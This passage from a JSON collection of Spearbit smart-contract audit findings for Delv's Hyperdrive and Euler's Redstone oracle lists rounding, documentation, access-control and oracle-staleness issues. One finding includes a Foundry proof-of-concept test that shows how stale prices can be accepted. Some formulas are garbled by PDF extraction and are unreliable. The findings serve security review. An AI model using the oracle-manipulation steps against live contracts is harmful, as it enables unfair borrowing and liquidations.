        "body": "Unchecked operations may be applied in certain areas where it's known not to overflow/underflow. Therefore, if already exists a check that a > b or a >= b, it is safe to assume than a - b would be safe. Addition- ally, uint256 counters are likely to never reach the maximum value.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Gas Optimization HyperdriveFactory.sol#L794, HyperdriveFactory.sol#L637, HyperdriveFactory.sol#L834,"
        ]
    },
    {
        "title": "Postfix function names with Down or Up if they are overestimating or underestimating the returned value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "Some utility functions return overestimated or underestimated values.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "The use of _convertToBaseFromOption may be unnecesary and needs more testing",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "_convertToBaseFromOption is a helper function that depending on options.asBase, will return the same amount or mulDown by _vaultSharePrice. The comment in _collectGovernanceFee regarding the return value, /// @return proceeds The amount collected in units specified by _options., may seem to imply that the return value, before being returned, is converted through _convertToBaseFromOption to accomplish it. However, the return value doesn't include any call to _convertToBaseFromOption while the emit in the same function does. Actually, removing all the instances of _convertToBaseFromOption from the code, or adding _convertToBaseFro- mOption call for the return value in _collectGovernanceFee, didn't provide any change in the foundry tests (all the tests worked), which points towards:  There is a gap in the tests / code as it's not properly validating that the output of functions where _convert- ToBaseFromOption is used in the return value is converted or keep at it is. and / or:  The function may be redundant in the current code, as the conversion it's already being done in other inter- mediary functions.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "isInstances can be spammed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "deployAndInitialize can be callable by anyone. The function pushes to the isInstances array, and there is no way of removing or reordering any of the elements. For example, as a correct deployment happens, it can be followed by tons of dummy deployments between legitimate calls. In fact, a couple of bad UX situations may arise due to:  getInstancesInRange may return a lot of dummy information that may be need to filtered later.  If the amount pushed between elements to obtain is high enough, it can deny on-chain integrations.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rounding errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "Throughout the contracts we've noticed various rounding errors.  LPMath.sol#L84-L102: In case we want to err on the side of slightly higher effective share reserves, the positive shareAdjustment should round down and the negative up.  HyperdriveBase.sol#L105: The timeRemaining is rounding down in all the instances but in fact it depends for the portion used when we are trading on the flat curve or the curve. When we trade on the flat we should round up and when we trade on the curve we should round down. Consider creating 2 functions _calculateTimeRemainingDown and _calculateTimeRemainingUp and use them accordingly. The same would apply for the _calculateTimeRemainingScaled.  HyperdriveBase.sol#L488, HyperdriveBase.sol#L564: We should overestimate the curveFee and the flat- Fee, the governance fee rounding down is acceptable as the governance wants to capture the lower bound but the curve/flat fees should round up to not be in user's favor.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Improper documentation for Zombie Interest",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "The team has chosen to implement a fix for any interest that will accrue for long/short positions that aren't closed after maturity and that accrue interest until they are fully closed. The fix is called Zombie Interest and is not properly documented within the whitepaper/code or official documentation. The only documentation we could find was in a pull request (see PR 721).",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "calculateTimeStretch can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "In calculateTimeStretch when one wants to calculate the timeStretch for position durations other than 1 year, one uses the following formula: Below A = (cid:22)ze y (1 + at1)Ats,0 = 1 (1 + at2)Ats,1 = 1 ts,1 = ln(( ts,0 ) ln( 1 1 + at2 1 1 + at1 )1=ts,0 ) = ln(1 + at2) ln(1 + at1) parameter description ts,0 ts,1 initial timeStretch for the position duration t1 time stretch for a custom _positionDuration equal to t2 In the above derivation we need to make sure when the liquidity pool is initialised the scaled ratio of the reserves would equal to A.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "In calculateDistributeExcessIdleShareProceedsNetLongEdgeCaseSafe the presentValueParams curve data are updated in memory",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "present- ValueParams curve data are updated in memory (z, (cid:16), y ) to (zog, (cid:16)og, yog), although it is not needed in calculateNetFlatTrade. The effect is that these memory positions are updated but not read anymore during to calculateDistributeExcessIdleShareProceedsNetLongEdgeCaseSafe, the execution since after the call calculateDistributeExcessIdleShareProceeds returns which in turn calculateDistributeExcessIdle returns: the 39 // Calculate the amount of withdrawal shares that should be redeemed // and their share proceeds. (uint256 withdrawalSharesRedeemed, uint256 shareProceeds) = LPMath .calculateDistributeExcessIdle( _getDistributeExcessIdleParams( idle, withdrawalSharesTotalSupply, _vaultSharePrice ) ); // Update the withdrawal pool _withdrawPool.readyToWithdraw += withdrawalSharesRedeemed.toUint128(); _withdrawPool.proceeds += shareProceeds.toUint128(); s state.  // Remove the withdrawal pool proceeds from the reserves. _updateLiquidity(-int256(shareProceeds)); the generated _getDistributeExcessIdleParams(...) not used afterwards.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "calculateShares...GivenBonds...DerivativeSafe can be refactored",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "Both:  calculateSharesOutGivenBondsInDerivativeSafe and  calculateSharesInGivenBondsOutDerivativeSafe use the same formula except that one adds _bondAmount to bondReserves and the other subtracts in the calcula- tions. d(cid:12)(z, (cid:16), y ) dz = 1 (cid:0) (cid:16)og zog! 1 (cid:0) 1 c (cid:22) (K (cid:0) (y + (cid:1)y)1(cid:0)ts ) c ts 1 (cid:0) ts c((cid:22)(z (cid:0) (cid:16)))(cid:0)ts + y (cid:0)ts yog zog (cid:0) (cid:16)og! (cid:0) (y + (cid:1)y )(cid:0)ts yog zog (cid:0) (cid:16)og! where K is: K = c ((cid:22)(z (cid:0) (cid:16)))1(cid:0)ts + y 1(cid:0)ts (cid:22) 40 and (cid:1)y can also be negative.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "The implementation of exp and ln are not verified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "The implementations of exp and ln are not verified due to a lack of time for the engagement. Specifically, the derivation of the rational approximations used in these functions has not been checked.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "The functions pow, exp and ln are not monotonic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "The functions pow, exp, and ln are not monotonic. For example, basically ln(x) is approximated as: A (cid:1) sgn( p( x) ) q( x) j $ p( x) q( x) j % D + B(blog2(x)c) + C 7 7 7 7 7 7 7 5 6 6 6 6 6 6 6 4 where A, B, C, D 2 N and p, q 2 Z[x] and x is the normalised x. x (cid:1) 296 2blog2(x)c% 1. x as a function of x is not monotone (not order-preserving). x = $ 2. The rational approximation term which is multiples to A is not necessarily monotone. Thus in general one cannot expect that if x1 (cid:20) x2 we would have f (x1) (cid:20) f (x2) (or the other way around for non-increasing functions). The codebase has multiple if / else branching logic when it comes to using pow and it is assumed / commented that pow is a non-decreasing function: 42 if (inner >= ONE) { // Rounding down the exponent results in a smaller result. <--- not true in general inner = inner.pow(X.divDown(Y)); } else { // Rounding up the exponent results in a smaller result. <--- not true in general inner = inner.pow(X.divUp(Y)); }",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "toString fails for large numbers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "The max string length for a uint256 should be: ceil(log_10(2 (cid:2) 256 - 1)) = ceil(77.06) = 78. But the contract uses maxStringLength = 77. Calling toString with high values will fail.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Net-short case always uses calculateSharesInGivenBondsOut derivative",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "In the net-short case of calculateDistributeExcessIdleShareProceeds, Newton's method is used with the net s in(x, ys (cid:1) ts (cid:0) yl (cid:1) tl ) derivative. However, as mentioned in the documentation and code, this derivative may only be used if ys (cid:1) ts (cid:0) yl (cid:1) tl (cid:20) y max",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Properly document the return values of the derivative functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "The derivation for the calculations is given here. Referring to this notation:  Currently, calculateSharesOutGivenBondsInDerivativeSafe returns net l 0 c (x) = (cid:0)z 0 out (x, yl (cid:1) tl (cid:0) ys (cid:1) ts), in- stead of just z 0 out as the name would suggest.  The function's Natspec and the returned value should match. Consider changing the function to return the negated value so it matches the current Natspec (-(1 - zeta / z) * ...) and z 0 out . Alternatively, rename the function and change the Natspec to (1 - zeta / z) * ... such that it matches the return value.  (the derivative we use is 1 minus this derivative so this rounds the derivative up). The above comment refers to many different \"derivatives\" and it's unclear what they refer to. be z_out method. Consider being more explicit about what is being referred to. It could (x) that the caller uses for the Newton , the return value of this function, or the derivative F    Document that calculateSharesInGivenBondsOutDerivativeSafe should return net s tl ). The Natspec and returned value currently match.  (the derivative we use is 1 minus this derivative so this rounds the derivative up). 0 c (x) = z 0 in(x, ys (cid:1) ts (cid:0) yl (cid:1)  The above comment refers to many different \"derivatives\" and it's unclear what they refer to. It could be (x) that the caller uses for the Newton method. Consider being more explicit , or the derivative F z_in about what is being referred to. ",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Integrating new ERC4626 vaults should check for read-only reentrancy issues",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "Hyperdrive supports generic ERC4626 vaults with the ERC4626Hyperdrive contract deployments. The vault share price is read in its _pricePerVaultShare() function. It might be possible that this value can be temporarily inflated in the vault, for example, through read-only reentrancy or adjacent issues where the vault grants a callback in the middle of some function and it leaves the protocol in a state that temporarily overestimates the price until the end of its execution. One could, for example, create a checkpoint at an inflated price.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Signature replay risk in case of a hard fork",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "Using an immutable DOMAIN_SEPARATOR creates a vulnerability for replay attacks of all future signa- tures from the root chain being replayable in the forked chain due to the static chainId stored in DOMAIN_SEPARATOR.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Governance can block any ongoing deployment by changing storage parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "Deployments done in HyperdriveFactory are done via a multi-step process. If an admin changes any of the related storage variables during a deployment, it will revert. This is due to the check regarding the config hash being the same in all stages. Therefore, an admin can DoS any deployment.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Minting destination can be address(0), locking assets in the process",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "Unlike _transferFrom and the batch version of _transferFrom, _mint doesn't check if the destina- tion is address(0), therefore it could accidentally mint these tokens to an unreachable address by the user in case options.destination isn't set properly. Actually, the code mints initially to zero address by decision: // Mint the minimum share reserves to the zero address as a buffer that // ensures that the total LP supply is always greater than or equal to // the minimum share reserves. The initializer will receive slightly // less shares than they contributed to cover the shares set aside as a // buffer on the share reserves and the shares set aside for the zero // address, but this is a small price to pay for the added security // in practice. While this is indeed good for a part of the security, this initial amount can also be sent to another burn address, as 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, to ensure the invariant that \"LP supply is always greater or equal to the minimum share reserves\" and therefore, being able to add a safety check for default zero address. Luckily, ERC20Forwarder can use their superpowers and transfer from any address on desire, rescuing the assets. However, without taking into account this exceptional case, this would lead to a temporal lock of funds and the need of the ERC20Forwarder's intervention each time a user makes this mistake.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Following CEI pattern when posible aligns with best security practices",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "HyperdriveFactory.sol performs a refund call of the excess value that could be performed at the very end of the function, avoiding possible reentrancy issues. While there haven't been any direct reentrancy exploits identified, adhering to the Checks-Effects-Interactions (CEI) pattern is a good practice.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use of OpenZeppelin's EnumerableSet can simplifiy common logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "The current implementation for managing _deployerCoordinators and _instances, along with their respective checks (isDeployerCoordinator and isInstance), relies on manual array management and mapping for existence checks. This design can be simplified using a battle-tested mechanism like OpenZeppelin's Enumer- ableSet.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "CollectGovernanceFee event misses useful information",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "CollectGovernanceFee event tracks the destination address of the fee and the amount of proceeds withdrawn. However, the current implementation includes the following variable, but not who initiated the collection (there are 3 role types, one an array of addresses), which can be useful for monitoring in case of issues.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "pauser role can collectFees and may lead to unexpected behaviors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "In the current implementation, the pauser role has the ability to collect fees, a function that is not really aligned with a common pauser role. This mix of powers can lead to potential security risks and unexpected behavior.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Common and duplicated logic can be simplified to improve maintainability and readability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "In general, some new features from the Hyperdrive contracts contain instances where similar logic or patterns are replicated, leading to code duplication. Additionally, some contracts exhibit complex implementations that could benefit from simplification. Code duplication not only increases the maintenance effort but also raises the risk of inconsistencies and bugs during updates or modifications.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Naming can be more consistent",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "Various naming of parameters/functions can be more clear or consistent:  In ERC4626Target0.sol#L28: there is a declaration of __vault rather than _vault to avoid shadowing the Base contract _vault definition, however StETHTarget contracts use the _lido variable for both the Base and Target contracts, leading to (a harmless) shadowing. Rename _lido instances to __lido to avoid shadowing and keep naming consistency.  LPMath.sol#L156: the custom error name is not accurate as success can be false due to calculateNetCurveTradeSafe returning success == false.  HyperdriveBase.sol#L156: the long exposure usually represents the bonds, here it is transformed into shares, so it would be better to rename this variable to longExposureShares to avoid any confusion. 47",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Index can go out of range",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "The functions getDeployerCoordinatorsInRange and getInstancesInRange have some checks to verify endIndex is within the bounds to iterate over _instances and _deployerCoordinators. However, the actual check allows endIndex to be equal to the array length, and if this happens, it will result in an out-of-bounds access as indices are 0-based and the last valid index is length - 1.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "A common EIP712 interface can be declared to avoid duplication of code",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "IERC20Forwarder interfaces. This implies code duplication of interfaces and can affect maintainability, as both can inherit from a common EIP712 interface and any change or comment would only affect a single file.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Single-step governance transfer can be risky",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "The code introduces a function to set the governance address in a single step and without default- value checks. Single-step governance transfers add the risk of setting an unwanted governance by accident if the governance transfer is not done with excessive care it can be lost forever.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Events lacking useful information affect monitoring",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "Events are key for external applications and monitoring the use of the system. In some cases, key variables are missing. For example, when updating _pauser[who] status, no event is emitted regarding which status it is updated to, therefore unexpected scenarios may arise. Also, if we redeem shares in the _removeLiquidity, there isn't a RedeemWithdrawalShares event emitted. It is advisble to be consistent with the events emitted under certain flows. One can do lpAmount - withdrawal- ShareAmount to get the actual redeemed shares though.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing/wrong comments and typos affect readability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "Comments help to provide context and documentation on what different functions, contracts and variables do. Providing clear and precise comments is key to a clean and maintainable codebase. See below a list of related nitpicks:  Missing comments:  FixedPointMath.sol#L216-L225: A reference to ilog2 implementation should be included.  YieldSpaceMath#322: The calculateMaxBuyBondsOut has a comment about rounding, consider adding one for calculateMaxBuySharesIn as well.  HyperdriveBase.sol#L524: NatSpec is missing for totalGovernanceFee.  Typos:  LPMath.sol#L407: algorith should be algorithm.  HyperdriveBase#L382: zombhie should be zombie.  HyperdriveLP#L202: .T should be . T.  HyperdriveLong#L55: mininum should be minimum.  HyperdriveLong#L209: be should be by. 49  StETHHyperdriveCoreDeployer.sol#L19, StETHTarget3Deployer.sol#L19, get1Deployer.sol#L19, StETHTarget4Deployer.sol#L19: Instanstiates should be Instantiates. StETHTarget2Deployer.sol#L19, StETHTar- StETHTarget0Deployer.sol#L19,  StETHTarget0.sol#L46: teth should be the.  Hyperdrive.sol#L86-87: contains all /// some stateful should be contains stateful.  HyperdriveFactory.sol#L130: coordintor should be coordinator.  LPMath.sol#L528: the comment states that the ending present value should be greater but it's actually greater or equal.  Wrong comment:  FixedPointMath.sol#L227, it reduces the range to [1, 2) * 2**96. Note the inclusion of 1 * 2**96.  LPMath#L1050: is a copy pasted comment from if block, should be less rather than greater.  StETHBase.sol#L59: Mentions another token than the one used; WETH should be ETH.  ERC4626Base.sol#L138: Data provider is no longer a component.  HyperdriveTarget2.sol#L35-36: short should be long.  HyperdriveTarget4.sol#L38-39: long should be short.  AssetId.sol#L85-L90: comment and function name suggest the naming of the variable is copy pasted from previous function, should be _symbol not _name.  HyperdriveBase#L496: comment stays curve_fee * p * phi_gov but the calculation doesn't include spot price governanceCurveFee = curve_fee * phi_gov.  LPMath.sol#L1507: NatSpec says ... k(x) / ((c / mu) + 1) ... but should just be k(x).  HyperdriveShort.sol#L453: the comment should be We remove the governance fee from the share reservers.  ERC4626Target0.sol#L37: mentions transferFrom selector with no instances of transferFrom but transfer in the function.  Incomplete comment:  HyperdriveBase.sol#L242: were purchased above price of 1 base per bonds. should be were purchased above the price of 1 base per bond.  FixedPointMath.sol#L201: should include or zero.  ERC4626Target1.sol#L11: misses This contract contains several stateful functions that  couldn t fit into the Hyperdrive contract.  IHyperdriveGovernedRegistry.sol#L18: set should be to set.  NatSpec:  IMultiTokenCore.sol#L22: Missing NatSpec.  IMultiTokenRead.sol#L5: Missing 3 @params.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational FixedPointMath.sol#L216-L225, FixedPointMath.sol#L201, LPMath#L1050, HyperdriveLong#L55, FixedPointMath.sol#L227,"
        ]
    },
    {
        "title": "Favor constants over \"magic numbers\"",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "While in certain parts of the code constants are used to represent some values as 1e18, in others these constants although declared, are unused.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use custom errors consistently",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "The current error handling in the smart contracts utilizes custom errors, except at this instance: require(effectiveShareReserves >= 0); Which lacks an error string, which would aid monitoring.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unnecessary type casts can be avoided",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "Casting a data type to the same type (for example, a uint256 into a uint256) or a compatible one (in some cases) is unnecessary and only makes the code less clear. In other cases like HyperdriveLong.sol#L253, it's first defined as uint128 and then casted to uint256, which can be done in a single step as in HyperdriveLong.sol#L338.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused code increases deployment cost and decreases maintainability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-February-2024.pdf",
        "body": "There are several libraries that were left behind after some updates and are not used anymore. Unused code increases the overall complexity of the codebase, making it harder to maintain and read while also having potential implications on gas costs, as it contributes to larger contract sizes which affect deployment costs.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "RedstoneCoreOracle.updatePrice can revert and use stale prices as not all price timestamps need to be the same",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "The Redstone oracle allows users to provide signed data packages through the updatePrice func- tion (signed by verified parties with a minimum threshold of signers required). The current code operates on the assumption that all data packages contain the same timestamp. However, the Redstone SDK does not check this for the getOracleNumericValueFromTxMsg entrypoint. // the following is not true // The inherited Redstone consumer contract enforces that the timestamps are the same for all signers. if (timestamp == _cache.priceTimestamp) return; As the code checks that all timestamps are increasing the cached timestamp, unordered data packages will revert. There's a second bug that attackers can inject old data packages into updatePrice that use the old cached timestamp (which might already be stale) and the early return will skip validation for these, but they are still used to compute the median price value.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "RedstoneCoreOracle could allow picking up new price that are older compared to the current one",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "The current logic of the RedstoneCoreOracle implementation uses block.timestamp as the times- tamp to which a price has been observed instead of the real observation timestamp that is bound to the price itself. The validateTimestamp function allows the user to pick up a price that is at most maxPriceStaleness seconds in the past and one minute in the future. The comparison is made between the oracle price observed timestamp and block.timestamp but is not verifying that the price's timestamp is older than the current one stored in the contract inside the cacheUpdatedAt and cachedPrice. Given the checks made in updatePrice, validateTimestamp and _getQuote it's possible for an attacker to pick up a price in the several data packages that will be considered valid and will be older than the current selected one. 5 This could allow an attacker to pick a price that will benefit the operation performed on vaults where such price will be used, borrowing more than expected or liquidating a user that should not be liquidated. Let's assume we are in the current configuration:  maxCacheStaleness = 60 1 minute.  maxPriceStaleness = 180 3 minutes, this is the one used by default by Redstone in their SDK, see Red- stoneDefaultsLib. Starting data:  cachedPrice = 0  cacheUpdatedAt = 0  block.timestamp = 1000 Flow:  T0: updatePrice() is called with a price.timestamp (signed price timestamp) 60 seconds in the future com- pared to block.timestamp.  price.timestamp = 1060  updatePrice check ! block.timestamp <= maxCacheStaleness + cacheUpdatedAt (cid:25) 1000 <= 60+0 ! FALSE ! do not revert, OK.  validateTimestamp check ! timestamp - block.timestamp > TIMESTAMP_AHEAD_SECONDS ! 1060 - 1000 > 180 ! FALSE ! do not revert, OK. All the checks passed meaning that:  cacheUpdatedAt is updated at 1000  cachedPrice is updated at X (price1.value)  T0+: At this point, any call to updatePrice() done before cacheUpdatedAt + maxCacheStaleness + 1 will skip the price update.  T1: block.timestamp = 1061**, call updatePrice with newPrice.timestamp = 1059 updatePrice check ! block.timestamp <= maxCacheStaleness + cacheUpdatedAt ! 1061 <= 60+1000 ! FALSE ! do not revert, OK. validateTimestamp check: - ! staleness = block.timestamp - timestamp = 1061-1059 = 2 - ! staleness > maxPriceStaleness = 2 > 180 (cid:25) FALSE (cid:25) do not revert, OK  cacheUpdatedAt is updated at 1061  cachedPrice is updated at X (price2.value) The result is that price2 was older than price1 but the RedstoneCoreOracle has allowed the caller to submit and store such a price (price1.timestamp = 1060, price2.timestamp - 1059). Test: The following test replicates the behavior of the RedstoneCoreOracle modifying the logic of the contract for the sake of simplicity: // SPDX-License-Identifier: GPL-2.0-or-later pragma solidity 0.8.23; import {Test, console} from \"forge-std/Test.sol\"; import {Errors} from \"src/lib/Errors.sol\"; contract RSNewPriceInThePastTest is Test { uint256 DEFAULT_MAX_DATA_TIMESTAMP_AHEAD_SECONDS; uint256 maxPriceStaleness; uint256 maxCacheStaleness; uint208 cachedPrice; uint48 cacheUpdatedAt; 6 uint256 cachedId; struct RedstonePrice { uint256 id; uint48 timestamp; uint208 price; } function setUp() public { DEFAULT_MAX_DATA_TIMESTAMP_AHEAD_SECONDS = 60; // the same as the one from Redstone } function testPriceInThePast() external { maxCacheStaleness = 60; maxPriceStaleness = 180; // set the block.timestamp to 1000 vm.warp(1000); assertEq(block.timestamp, 1000); ///////////// // FIRST PRICE: in the future of 60 seconds ///////////// // propose first price, it will be in the future of 60 seconds (max allowed) uint48 price1Timestamp = 1060; RedstonePrice memory priceInTheFuture = RedstonePrice({id: 1, timestamp: price1Timestamp * ,! 1000, price: 1000}); updatePrice(priceInTheFuture); assertEq(cachedId, priceInTheFuture.id); assertEq(cachedPrice, priceInTheFuture.price); assertEq(cacheUpdatedAt, 1000); // current block.timestamp // just assert that it does not revert _getQuote(1, address(0), address(0)); ///////////// // SECOND PRICE: 1 second BEFORE the current price signed timestamp ///////////// // we want now prove that we are able to make the oracle accept a price that was in the PAST // compared to the price.timestamp (the signed timestamp of the price itself) // note: prev price timestamp was 1060, this price timestamp is 1059 uint48 price2Timestamp = price1Timestamp - 1; RedstonePrice memory priceInThePast = RedstonePrice({id: 2, timestamp: price2Timestamp * 1000, ,! price: 500}); // if we try to update before that ,! it  maxCacheStaleness has passed, it will just return and skip  vm.warp(1000 + maxCacheStaleness); // still need 1 second assertEq(block.timestamp, 1000 + maxCacheStaleness); // just assert that it does not revert updatePrice(priceInThePast); // assert that nothing has changed assertEq(cachedId, priceInTheFuture.id); // warp 1 second more compared to before, now we should be able to vm.warp(1000 + maxCacheStaleness + 1); assertEq(block.timestamp, 1000 + maxCacheStaleness + 1); 7 // now we can update the price updatePrice(priceInThePast); assertEq(cachedId, priceInThePast.id); assertEq(cachedPrice, priceInThePast.price); assertEq(cacheUpdatedAt, 1000 + maxCacheStaleness + 1); // current block.timestamp // just assert that it does not revert _getQuote(1, address(0), address(0)); } function updatePrice(RedstonePrice memory proposedPrice) internal { // Use the cache if it has not expired. if (block.timestamp <= maxCacheStaleness + cacheUpdatedAt) return; proposedPrice = getOracleNumericValueFromTxMsg(proposedPrice); if (proposedPrice.price > type(uint208).max) revert Errors.PriceOracle_Overflow(); // update values cachedId = uint48(proposedPrice.id); cachedPrice = uint208(proposedPrice.price); cacheUpdatedAt = uint48(block.timestamp); } function getOracleNumericValueFromTxMsg(RedstonePrice memory proposedPrice) internal returns (RedstonePrice memory) // redstone validation here // // callback to validate the price timestamp // validateTimestamp(proposedPrice); // validation performed, return the validated price return proposedPrice; { } function validateTimestamp(RedstonePrice memory proposedPrice) internal { uint256 timestamp = proposedPrice.timestamp / 1000; if (block.timestamp > timestamp) { uint256 staleness = block.timestamp - timestamp; console.log(\"block.timestamp\", block.timestamp); console.log(\"timestamp\", timestamp); console.log(\"staleness\", staleness); console.log(\"maxPriceStaleness\", maxPriceStaleness); if (staleness > maxPriceStaleness) revert Errors.PriceOracle_TooStale(staleness, ,! maxPriceStaleness); } else if (timestamp - block.timestamp > DEFAULT_MAX_DATA_TIMESTAMP_AHEAD_SECONDS) { revert Errors.PriceOracle_InvalidAnswer(); } } function _getQuote(uint256 inAmount, address _base, address _quote) internal view returns (uint256) { ,! uint256 staleness = block.timestamp - cacheUpdatedAt; if (staleness > maxCacheStaleness) revert Errors.PriceOracle_TooStale(staleness, ,! maxCacheStaleness);  // we don return 1; t care, it just need not revert } 8 }",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "BaseAdapter._getDecimals returns 18 decimals when the asset contract does not implement the decimals function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
